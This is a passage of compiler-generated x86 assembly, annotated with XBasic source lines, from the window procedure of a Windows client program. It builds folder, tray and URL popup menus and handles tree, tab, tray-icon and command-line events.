	call	_AppendMenuA@16			;;; i619
;
; [1576] AppendMenuA (#hMenuFolder, $$MF_STRING,$$TreePop_UpL,&"Upload to folder")
	mov	eax,addr @_string.0369.client			;;; i642
	push	eax			;;; i667a
	push	171			;;; i656a
	push	0			;;; i656a
	push	[%#hMenuFolder.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1577] AppendMenuA (#hMenuFolder, $$MF_SEPARATOR, 0, 0)
	push	0			;;; i656a
	push	0			;;; i656a
	push	2048			;;; i656a
	push	[%#hMenuFolder.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1578] AppendMenuA (#hMenuFolder, $$MF_STRING,$$TreePop_Refresh,&"Refresh")
	mov	eax,addr @_string.0363.client			;;; i642
	push	eax			;;; i667a
	push	165			;;; i656a
	push	0			;;; i656a
	push	[%#hMenuFolder.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1579] AppendMenuA (#hMenuFolder, $$MF_SEPARATOR, 0, 0)
	push	0			;;; i656a
	push	0			;;; i656a
	push	2048			;;; i656a
	push	[%#hMenuFolder.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1580] AppendMenuA (#hMenuFolder, $$MF_STRING,$$TreePop_CreateD,&"New folder")
	mov	eax,addr @_string.0364.client			;;; i642
	push	eax			;;; i667a
	push	162			;;; i656a
	push	0			;;; i656a
	push	[%#hMenuFolder.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1581] AppendMenuA (#hMenuFolder, $$MF_STRING,$$TreePop_DelDir,&"Delete folder")
	mov	eax,addr @_string.036A.client			;;; i642
	push	eax			;;; i667a
	push	173			;;; i656a
	push	0			;;; i656a
	push	[%#hMenuFolder.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1582] AppendMenuA (#hMenuFolder, $$MF_STRING,$$TreePop_Rename,&"Rename folder")
	mov	eax,addr @_string.036B.client			;;; i642
	push	eax			;;; i667a
	push	164			;;; i656a
	push	0			;;; i656a
	push	[%#hMenuFolder.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1583] AppendMenuA (#hMenuFolder, $$MF_STRING,$$TreePop_RemFiles,&"Delete all files")
	mov	eax,addr @_string.036C.client			;;; i642
	push	eax			;;; i667a
	push	174			;;; i656a
	push	0			;;; i656a
	push	[%#hMenuFolder.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1584] AppendMenuA (#hMenuFolder, $$MF_SEPARATOR, 0, 0)
	push	0			;;; i656a
	push	0			;;; i656a
	push	2048			;;; i656a
	push	[%#hMenuFolder.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1585] AppendMenuA (#hMenuFolder, $$MF_STRING,$$TreePop_Prop,&"Properties")
	mov	eax,addr @_string.0367.client			;;; i642
	push	eax			;;; i667a
	push	175			;;; i656a
	push	0			;;; i656a
	push	[%#hMenuFolder.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1587] #hSysTrayMenu = CreatePopupMenu ()
	call	_CreatePopupMenu@0			;;; i619
	mov	d[%#hSysTrayMenu.client],eax			;;; i668
;
; [1588] AppendMenuA (#hSysTrayMenu, $$MF_STRING, $$PopUp_Exit, &"&Exit")
	mov	eax,addr @_string.036F.client			;;; i642
	push	eax			;;; i667a
	push	134			;;; i656a
	push	0			;;; i656a
	push	[%#hSysTrayMenu.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1590] #hMenuURL = CreatePopupMenu ()
	call	_CreatePopupMenu@0			;;; i619
	mov	d[%#hMenuURL.client],eax			;;; i668
;
; [1591] AppendMenuA (#hMenuURL, $$MF_STRING, $$EventURL_Open, &"Open URL")
	mov	eax,addr @_string.0371.client			;;; i642
	push	eax			;;; i667a
	push	180			;;; i656a
	push	0			;;; i656a
	push	[%#hMenuURL.client]			;;; i672a
	call	_AppendMenuA@16			;;; i619
;
; [1593] CASE $$WM_NOTIFY :
	jmp	end.select.00AC.client			;;; i69
case.00AC.0001.client:
	mov	eax,78			;;; i659
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00AC.0002.client			;;; i71
;
; [1594] GetNotifyMsg (lParam, @hwndFrom, @idFrom, @code)
#ifdef WndProc.hwndFrom
#undef WndProc.hwndFrom
#endif
#define WndProc.hwndFrom ebp-60	; exposes local variable 'hwndFrom'
;
#ifdef WndProc.idFrom
#undef WndProc.idFrom
#endif
#define WndProc.idFrom ebp-64	; exposes local variable 'idFrom'
;
#ifdef WndProc.code
#undef WndProc.code
#endif
#define WndProc.code ebp-68	; exposes local variable 'code'
;
	push	[ebp-68]			;;; i674a
	push	[ebp-64]			;;; i674a
	push	[ebp-60]			;;; i674a
	push	[ebp+20]			;;; i674a
	call	func28.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	ebx,d[esp-8]			;;; i877b
	mov	edi,d[esp-4]			;;; i877c
	mov	d[ebp-60],ecx			;;; i670
	mov	d[ebp-64],ebx			;;; i670
	mov	d[ebp-68],edi			;;; i670
;
; [1595] idCtrl = idFrom
#ifdef WndProc.idCtrl
#undef WndProc.idCtrl
#endif
#define WndProc.idCtrl ebp-72	; exposes local variable 'idCtrl'
;
	mov	eax,d[ebp-64]			;;; i665
	mov	d[ebp-72],eax			;;; i670
;
; [1597] SELECT CASE idCtrl
	mov	eax,d[ebp-72]			;;; i665
; .select5.00AD = ebp-76	; internal variable
	mov	d[ebp-76],eax			;;; i670
;
; [1598] CASE $$event
	mov	eax,201			;;; i659
	mov	ebx,d[ebp-76]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00AD.0001.client			;;; i71
;
; [1599] SELECT CASE code
	mov	eax,d[ebp-68]			;;; i665
; .select5.00AE = ebp-80	; internal variable
	mov	d[ebp-80],eax			;;; i670
;
; [1600] CASE $$EN_LINK	:
	mov	eax,1803			;;; i659
	mov	ebx,d[ebp-80]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00AE.0001.client			;;; i71
;
; [1601] RtlMoveMemory (&en, lParam, SIZE(en))
	mov	eax,d[%5%en.client]			;;; i642
	mov	d[ebp-56],eax			;;; i670
	mov	eax,32			;;; i584
	push	eax			;;; i667a
	push	[ebp+20]			;;; i674a
	push	[ebp-56]			;;; i674a
	call	_RtlMoveMemory@12			;;; i619
;
; [1602] 'getex.cb = (en.chrg.cpMax - en.chrg.cpMin)+1
;
; [1603] 'getex.flags = $$GT_SELECTION
;
; [1604] 'getex.codepage = $$CP_ACP
;
; [1606] buffer = NULL$((en.chrg.cpMax - en.chrg.cpMin)+1)
	sub	esp,64			;;; i487
	mov	eax,d[%5%en.client]			;;; i663a
	mov	eax,d[eax+28]			;;; i313b
	mov	ebx,d[%5%en.client]			;;; i663a
	mov	ebx,d[ebx+24]			;;; i313b
	sub	eax,ebx			;;; i791
	add	eax,1			;;; i775
	mov	d[esp],eax			;;; i887
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1607] txtr.chrg = en.chrg
	mov	eax,d[%5%en.client]			;;; i663a
	lea	eax,[eax+24]			;;; i314
	mov	ebx,d[%5%txtr.client]			;;; i663a
	mov	edi,ebx			;;; i14a
	mov	esi,eax			;;; i7
	mov	ecx,8			;;; i1
	call	%_AssignComposite			;;; i2
;
; [1608] txtr.lpstrText = &buffer
	mov	eax,d[ebp-44]			;;; i642
	mov	ebx,d[%5%txtr.client]			;;; i663a
	mov	d[ebx+8],eax			;;; i13b
;
; [1609] ret = SendMessageA (en.hdr.hwndFrom, $$EM_GETTEXTRANGE  ,0, &txtr)' EM_GETTEXTEX
#ifdef WndProc.ret
#undef WndProc.ret
#endif
#define WndProc.ret ebp-84	; exposes local variable 'ret'
;
	mov	eax,d[%5%en.client]			;;; i663a
	mov	eax,d[eax]			;;; i313b
	mov	d[ebp-56],eax			;;; i670
	mov	eax,d[%5%txtr.client]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	1099			;;; i656a
	push	[ebp-56]			;;; i674a
	call	_SendMessageA@16			;;; i619
	mov	d[ebp-84],eax			;;; i670
;
; [1611] SELECT CASE en.msg
	mov	eax,d[%5%en.client]			;;; i663a
	mov	eax,d[eax+12]			;;; i313b
; .select5.00AF = ebp-88	; internal variable
	mov	d[ebp-88],eax			;;; i670
;
; [1612] CASE $$WM_LBUTTONDBLCLK		:'PRINT "l",ret,URLBuffer
	mov	eax,515			;;; i659
	or	eax,eax			;;; i366
	jns	> A.309			;;; i367
	call	%_eeeOverflow			;;; i368
A.309:
	mov	ebx,d[ebp-88]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00AF.0001.client			;;; i71
;
; [1613] CASE $$WM_RBUTTONDOWN		:'PRINT "r",ret,URLBuffer
	jmp	end.select.00AF.client			;;; i69
case.00AF.0001.client:
	mov	eax,516			;;; i659
	or	eax,eax			;;; i366
	jns	> A.310			;;; i367
	call	%_eeeOverflow			;;; i368
A.310:
	mov	ebx,d[ebp-88]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00AF.0002.client			;;; i71
;
; [1614] IF buffer != "" THEN
	mov	eax,[ebp-44]			;;; i665
	xor	ebx,ebx			;;; i658
	call	%_string.compare.vv			;;; i690
	je	>> else.00B0.client			;;; i219
;
; [1615] pt.x = LOWORD(en.lParam): pt.y = HIWORD(en.lParam)
	mov	eax,d[%5%en.client]			;;; i663a
	mov	eax,d[eax+20]			;;; i313b
	push	eax			;;; i667a
	call	func1E.client			;;; i619
	mov	ebx,d[%5%pt.client]			;;; i663a
	mov	d[ebx],eax			;;; i13b
	mov	eax,d[%5%en.client]			;;; i663a
	mov	eax,d[eax+20]			;;; i313b
	push	eax			;;; i667a
	call	func1D.client			;;; i619
	mov	ebx,d[%5%pt.client]			;;; i663a
	mov	d[ebx+4],eax			;;; i13b
;
; [1616] ClientToScreen (en.hdr.hwndFrom, &pt)
;
; [0] EXTERNAL FUNCTION ClientToScreen (hwnd, lpPoint)
	mov	eax,d[%5%en.client]			;;; i663a
	mov	eax,d[eax]			;;; i313b
	mov	d[ebp-56],eax			;;; i670
	mov	eax,d[%5%pt.client]			;;; i642
	push	eax			;;; i667a
	push	[ebp-56]			;;; i674a
	call	_ClientToScreen@8			;;; i619
;
; [1617] URLBuffer = buffer
	mov	eax,[ebp-44]			;;; i665
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %URLBuffer.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1618] TrackPopupMenuEx (#hMenuURL, $$TPM_LEFTALIGN | $$TPM_LEFTBUTTON | $$TPM_RIGHTBUTTON, pt.x, pt.y, en.hdr.hwndFrom, 0)
;
; [0] EXTERNAL FUNCTION TrackPopupMenuEx (hMenu, un, n1, n2, hWnd, lpTPMParams)
	mov	eax,0			;;; i659
	or	eax,0			;;; i763
	or	eax,2			;;; i763
	mov	d[ebp-56],eax			;;; i670
	mov	eax,d[%5%pt.client]			;;; i663a
	mov	eax,d[eax]			;;; i313b
; .xstk5.0001 = ebp-96	; internal variable
	mov	d[ebp-96],eax			;;; i670
	mov	eax,d[%5%pt.client]			;;; i663a
	mov	eax,d[eax+4]			;;; i313b
; .xstk5.0002 = ebp-104	; internal variable
	mov	d[ebp-104],eax			;;; i670
	mov	eax,d[%5%en.client]			;;; i663a
	mov	eax,d[eax]			;;; i313b
; .xstk5.0003 = ebp-112	; internal variable
	mov	d[ebp-112],eax			;;; i670
	push	0			;;; i656a
	push	[ebp-112]			;;; i674a
	push	[ebp-104]			;;; i674a
	push	[ebp-96]			;;; i674a
	push	[ebp-56]			;;; i674a
	push	[%#hMenuURL.client]			;;; i672a
	call	_TrackPopupMenuEx@24			;;; i619
;
; [1619] END IF
else.00B0.client:
end.if.00B0.client:
;
; [1620] END SELECT
case.00AF.0002.client:
end.select.00AF.client:
;
; [1621] END SELECT
case.00AE.0001.client:
end.select.00AE.client:
;
; [1623] CASE $$tree
	jmp	end.select.00AD.client			;;; i69
case.00AD.0001.client:
	mov	eax,205			;;; i659
	mov	ebx,d[ebp-76]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00AD.0002.client			;;; i71
;
; [1624] SELECT CASE code
	mov	eax,d[ebp-68]			;;; i665
; .select5.00B1 = ebp-116	; internal variable
	mov	d[ebp-116],eax			;;; i670
;
; [1625] CASE $$TVN_SELCHANGED :
	mov	eax,-402			;;; i659
	mov	ebx,d[ebp-116]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00B1.0001.client			;;; i71
;
; [1626] hItem = getTreeSelection (#tree_tab)
#ifdef WndProc.hItem
#undef WndProc.hItem
#endif
#define WndProc.hItem ebp-120	; exposes local variable 'hItem'
;
	push	[%#tree_tab.client]			;;; i672a
	call	func50.client			;;; i619
	mov	d[ebp-120],eax			;;; i670
;
; [1627] IFZ hItem THEN RETURN
	mov	eax,d[ebp-120]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.00B2.client			;;; i195
	xor	eax,eax			;;; i862
	jmp	end.func5.client			;;; i258
else.00B2.client:
end.if.00B2.client:
;
; [1628] msg$ = getTreeCompLabel (hItem)
	push	[ebp-120]			;;; i674a
	call	func52.client			;;; i619
	mov	ebx,addr %5%msg$.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1629] IF msg$ THEN
	mov	eax,[%5%msg$.client]			;;; i663a
	test	eax,eax			;;; i214
	jz	>> else.00B3.client			;;; i215
	mov	eax,d[eax-8]			;;; i216
	test	eax,eax			;;; i217
	jz	>> else.00B3.client			;;; i218
;
; [1630] IF RIGHT$(msg$,1) == "\\" THEN
	sub	esp,64			;;; i487
	mov	eax,[%5%msg$.client]			;;; i663a
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0149.client			;;; i663
	call	%_string.compare.sv			;;; i690
	jne	>> else.00B4.client			;;; i219
;
; [1631] IFZ getTreeChild (hItem) THEN
	push	[ebp-120]			;;; i674a
	call	func55.client			;;; i619
	test	eax,eax			;;; i194
	jnz	>> else.00B5.client			;;; i195
;
; [1632] setTreeChild (hItem)
	push	[ebp-120]			;;; i674a
	call	func56.client			;;; i619
;
; [1633] SendSMessage(idx,"treeb "+STRING$(hItem)+" "+msg$)
#ifdef WndProc.idx
#undef WndProc.idx
#endif
#define WndProc.idx ebp-124	; exposes local variable 'idx'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp-120]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.014D.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0145.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[%5%msg$.client]			;;; i663a
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp-124]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1634] END IF
else.00B5.client:
end.if.00B5.client:
;
; [1635] END IF
else.00B4.client:
end.if.00B4.client:
;
; [1636] END IF
else.00B3.client:
end.if.00B3.client:
;
; [1637] END SELECT
case.00B1.0001.client:
end.select.00B1.client:
;
; [1638] CASE $$Tab1 :
	jmp	end.select.00AD.client			;;; i69
case.00AD.0002.client:
	mov	eax,120			;;; i659
	mov	ebx,d[ebp-76]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00AD.0003.client			;;; i71
;
; [1639] SELECT CASE code
	mov	eax,d[ebp-68]			;;; i665
; .select5.00B6 = ebp-128	; internal variable
	mov	d[ebp-128],eax			;;; i670
;
; [1640] CASE $$TCN_SELCHANGE :
	mov	eax,-551			;;; i659
	mov	ebx,d[ebp-128]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00B6.0001.client			;;; i71
;
; [1641] iTab = SendMessageA (hwndFrom, $$TCM_GETCURSEL, 0, 0)
#ifdef WndProc.iTab
#undef WndProc.iTab
#endif
#define WndProc.iTab ebp-132	; exposes local variable 'iTab'
;
	push	0			;;; i656a
	push	0			;;; i656a
	push	4875			;;; i656a
	push	[ebp-60]			;;; i674a
	call	_SendMessageA@16			;;; i619
	mov	d[ebp-132],eax			;;; i670
;
; [1642] FOR t = 0 TO UBOUND(TabChildCon[])' hide nonselected tabs
#ifdef WndProc.t
#undef WndProc.t
#endif
#define WndProc.t ebp-136	; exposes local variable 't'
;
	mov	eax,0			;;; i659
	mov	d[ebp-136],eax			;;; i670
	mov	eax,d[%%%TabChildCon.client]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.311			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.311:
	dec	eax			;;; i596
; .forlimit5.00B7 = ebp-140	; internal variable
	mov	d[ebp-140],eax			;;; i670
align 8
for.00B7.client:
	mov	eax,d[ebp-136]			;;; i665
	mov	ebx,d[ebp-140]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.00B7.client			;;; i154
;
; [1643] IF (t != iTab) THEN ShowWindow (GetTabChild(t), $$SW_HIDE)
	mov	eax,d[ebp-136]			;;; i665
	mov	ebx,d[ebp-132]			;;; i665
	cmp	eax,ebx			;;; i684a
	je	>> else.00B8.client			;;; i219
;
; [0] EXTERNAL FUNCTION ShowWindow (hwnd, nCmdShow)
	push	[ebp-136]			;;; i674a
	call	func29.client			;;; i619
	mov	d[ebp-56],eax			;;; i670
	push	0			;;; i656a
	push	[ebp-56]			;;; i674a
	call	_ShowWindow@8			;;; i619
else.00B8.client:
end.if.00B8.client:
;
; [1644] NEXT t
do.next.00B7.client:
	inc	d[ebp-136]			;;; i229
	jmp	for.00B7.client			;;; i231
end.for.00B7.client:
;
; [1645] ShowWindow (GetTabChild(iTab), $$SW_SHOWNORMAL)'show selected tab
	push	[ebp-132]			;;; i674a
	call	func29.client			;;; i619
	mov	d[ebp-56],eax			;;; i670
	push	1			;;; i656a
	push	[ebp-56]			;;; i674a
	call	_ShowWindow@8			;;; i619
;
; [1646] END SELECT
case.00B6.0001.client:
end.select.00B6.client:
;
; [1647] END SELECT
case.00AD.0003.client:
end.select.00AD.client:
;
; [1649] 'CASE $$WM_CREATE 		:
;
; [1650] CASE $$WM_DESTROY		:Shutdown (): RETURN
	jmp	end.select.00AC.client			;;; i69
case.00AC.0002.client:
	mov	eax,2			;;; i659
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00AC.0003.client			;;; i71
	call	func4.client			;;; i619
	xor	eax,eax			;;; i862
	jmp	end.func5.client			;;; i258
;
; [1651] CASE $$WM_TRAYICON 		:' taskbar mouse event message
	jmp	end.select.00AC.client			;;; i69
case.00AC.0003.client:
	mov	eax,1025			;;; i659
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00AC.0004.client			;;; i71
;
; [1652] SELECT CASE lParam
	mov	eax,d[ebp+20]			;;; i665
; .select5.00B9 = ebp-144	; internal variable
	mov	d[ebp-144],eax			;;; i670
;
; [1653] CASE $$WM_RBUTTONDOWN   :
	mov	eax,516			;;; i659
	mov	ebx,d[ebp-144]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00B9.0001.client			;;; i71
;
; [1654] GetCursorPos (&pt)
;
; [0] EXTERNAL FUNCTION GetCursorPos (lpPoint)
	mov	eax,d[%5%pt.client]			;;; i642
	push	eax			;;; i667a
	call	_GetCursorPos@4			;;; i619
;
; [1655] SetForegroundWindow (hWnd)
;
; [0] EXTERNAL FUNCTION SetForegroundWindow (hwnd)
	push	[ebp+8]			;;; i674a
	call	_SetForegroundWindow@4			;;; i619
;
; [1656] TrackPopupMenuEx (#hSysTrayMenu, $$TPM_LEFTALIGN | $$TPM_LEFTBUTTON | $$TPM_RIGHTBUTTON, pt.x, pt.y, hWnd, 0)
	mov	eax,0			;;; i659
	or	eax,0			;;; i763
	or	eax,2			;;; i763
	mov	d[ebp-56],eax			;;; i670
	mov	eax,d[%5%pt.client]			;;; i663a
	mov	eax,d[eax]			;;; i313b
	mov	d[ebp-96],eax			;;; i670
	mov	eax,d[%5%pt.client]			;;; i663a
	mov	eax,d[eax+4]			;;; i313b
	mov	d[ebp-104],eax			;;; i670
	push	0			;;; i656a
	push	[ebp+8]			;;; i674a
	push	[ebp-104]			;;; i674a
	push	[ebp-96]			;;; i674a
	push	[ebp-56]			;;; i674a
	push	[%#hSysTrayMenu.client]			;;; i672a
	call	_TrackPopupMenuEx@24			;;; i619
;
; [1658] CASE $$WM_LBUTTONDOWN   :
	jmp	end.select.00B9.client			;;; i69
case.00B9.0001.client:
	mov	eax,513			;;; i659
	mov	ebx,d[ebp-144]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00B9.0002.client			;;; i71
;
; [1659] ShowWindow (#winMain, $$SW_SHOWNORMAL)
data section 'globals$shared'
align	4
%#winMain.client:	db 4 dup ?
.code
	push	1			;;; i656a
	push	[%#winMain.client]			;;; i672a
	call	_ShowWindow@8			;;; i619
;
; [1660] SetForegroundWindow (hWnd)
	push	[ebp+8]			;;; i674a
	call	_SetForegroundWindow@4			;;; i619
;
; [1661] END SELECT
case.00B9.0002.client:
end.select.00B9.client:
;
; [1662] RETURN
	xor	eax,eax			;;; i862
	jmp	end.func5.client			;;; i258
;
; [1664] CASE $$WM_COMMAND :
	jmp	end.select.00AC.client			;;; i69
case.00AC.0004.client:
	mov	eax,273			;;; i659
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00AC.0005.client			;;; i71
;
; [1665] id         = LOWORD (wParam)
#ifdef WndProc.id
#undef WndProc.id
#endif
#define WndProc.id ebp-148	; exposes local variable 'id'
;
	push	[ebp+16]			;;; i674a
	call	func1E.client			;;; i619
	mov	d[ebp-148],eax			;;; i670
;
; [1666] notifyCode = HIWORD (wParam)
#ifdef WndProc.notifyCode
#undef WndProc.notifyCode
#endif
#define WndProc.notifyCode ebp-152	; exposes local variable 'notifyCode'
;
	push	[ebp+16]			;;; i674a
	call	func1D.client			;;; i619
	mov	d[ebp-152],eax			;;; i670
;
; [1667] hwndCtl    = lParam
#ifdef WndProc.hwndCtl
#undef WndProc.hwndCtl
#endif
#define WndProc.hwndCtl ebp-156	; exposes local variable 'hwndCtl'
;
	mov	eax,d[ebp+20]			;;; i665
	mov	d[ebp-156],eax			;;; i670
;
; [1669] SELECT CASE notifyCode
	mov	eax,d[ebp-152]			;;; i665
; .select5.00BA = ebp-160	; internal variable
	mov	d[ebp-160],eax			;;; i670
;
; [1670] CASE 0: IF (id == $$PopUp_Exit) THEN DestroyWindow (hWnd)
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-160]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00BA.0001.client			;;; i71
	mov	eax,d[ebp-148]			;;; i665
	cmp	eax,134			;;; i684a
	jne	>> else.00BB.client			;;; i219
;
; [0] EXTERNAL FUNCTION DestroyWindow (hwnd)
	push	[ebp+8]			;;; i674a
	call	_DestroyWindow@4			;;; i619
else.00BB.client:
end.if.00BB.client:
;
; [1671] CASE $$EDITBOX_RETURN :
	jmp	end.select.00BA.client			;;; i69
case.00BA.0001.client:
	mov	eax,402			;;; i659
	mov	ebx,d[ebp-160]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00BA.0002.client			;;; i71
;
; [1672] SELECT CASE id :
	mov	eax,d[ebp-148]			;;; i665
; .select5.00BC = ebp-164	; internal variable
	mov	d[ebp-164],eax			;;; i670
;
; [1673] CASE $$CmdLine	:
	mov	eax,401			;;; i659
	mov	ebx,d[ebp-164]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00BC.0001.client			;;; i71
;
; [1674] cmd = NULL$(1024)
	sub	esp,64			;;; i487
	mov	d[esp],1024
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1675] SendMessageA (hwndCtl, $$WM_GETTEXT, 1024, &cmd)
	mov	eax,d[ebp-40]			;;; i642
	push	eax			;;; i667a
	push	1024			;;; i656a
	push	13			;;; i656a
	push	[ebp-156]			;;; i674a
	call	_SendMessageA@16			;;; i619
;
; [1676] cmd = CSIZE$(cmd)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_csize.d.v			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1677] IF (cmd =="/") || (cmd =="//")THEN
	mov	eax,[ebp-40]			;;; i665
	mov	ebx,addr @_string.027E.client			;;; i663
	call	%_string.compare.vv			;;; i690
;>peep
	mov	eax,0			;;; i466
	jne	> A.313			;;; i467
	not	eax			;;; i468
A.313:
;+peep
	mov	d[ebp-56],eax			;;; i670
	mov	eax,[ebp-40]			;;; i665
	mov	ebx,addr @_string.039E.client			;;; i663
	call	%_string.compare.vv			;;; i690
;>peep
	mov	eax,0			;;; i466
	jne	> A.314			;;; i467
	not	eax			;;; i468
A.314:
;+peep
	mov	ebx,d[ebp-56]			;;; i665
	or	eax,ebx			;;; i732
	neg	eax			;;; i736
	rcr	eax,1			;;; i737
	sar	eax,31			;;; i738
	test	eax,eax			;;; i220
	jz	>> else.00BD.client			;;; i221
;
; [1678] SendMessageA (#CmdLine, $$WM_SETTEXT, 0, &lastcmd)
data section 'globals$shared'
align	4
%#CmdLine.client:	db 4 dup ?
.code
	mov	eax,d[%5%lastcmd.client]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	12			;;; i656a
	push	[%#CmdLine.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [1679] RETURN
	xor	eax,eax			;;; i862
	jmp	end.func5.client			;;; i258
;
; [1680] END IF
else.00BD.client:
end.if.00BD.client:
;
; [1681] ProcessClientText (cmd)
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func38.client			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
;
; [1682] lastcmd = cmd
	mov	eax,[ebp-40]			;;; i665
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %5%lastcmd.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1683] cmd = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1684] SendMessageA (#CmdLine, $$WM_SETTEXT, 0, &cmd)
	mov	eax,d[ebp-40]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	12			;;; i656a
	push	[%#CmdLine.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [1685] RETURN
	xor	eax,eax			;;; i862
	jmp	end.func5.client			;;; i258
;
; [1686] END SELECT
case.00BC.0001.client:
end.select.00BC.client:
;
; [1687] END SELECT
case.00BA.0002.client:
end.select.00BA.client:
;
; [1689] CASE #WM_TaskbarRestart	: InstallTrayIcon (hwnd)
	jmp	end.select.00AC.client			;;; i69
case.00AC.0005.client:
data section 'globals$shared'
align	4
%#WM_TaskbarRestart.client:	db 4 dup ?
.code
	mov	eax,d[%#WM_TaskbarRestart.client]			;;; i663a
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00AC.0006.client			;;; i71
#ifdef WndProc.hwnd
#undef WndProc.hwnd
#endif
#define WndProc.hwnd ebp-168	; exposes local variable 'hwnd'
;
	push	[ebp-168]			;;; i674a
	call	func19.client			;;; i619
;
; [1690] CASE $$WM_CTLCOLOREDIT,$$WM_CTLCOLORSTATIC,$$WM_CTLCOLORBTN
	jmp	end.select.00AC.client			;;; i69
case.00AC.0006.client:
	mov	eax,307			;;; i659
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	je	>> caser.00AC.0006.client			;;; i70
	mov	eax,312			;;; i659
	cmp	eax,ebx			;;; i684a
	je	>> caser.00AC.0006.client			;;; i70
	mov	eax,309			;;; i659
	cmp	eax,ebx			;;; i684a
	jne	>> case.00AC.0007.client			;;; i71
caser.00AC.0006.client:
;
; [1691] '	RETURN SetColor (RGB(100, 100, 100), RGB(212, 208, 200), wParam, lParam)
;
; [1692] '	hdcStatic = wParam
;
; [1693] '	hwndStatic = lParam
;
; [1694] '	SELECT CASE hwndStatic
;
; [1695] '	CASE #CmdLine:
;
; [1696] RETURN SetColor (RGB(150, 150, 150), RGB(212, 208, 200), wParam, lParam)
	push	150			;;; i656a
	push	150			;;; i656a
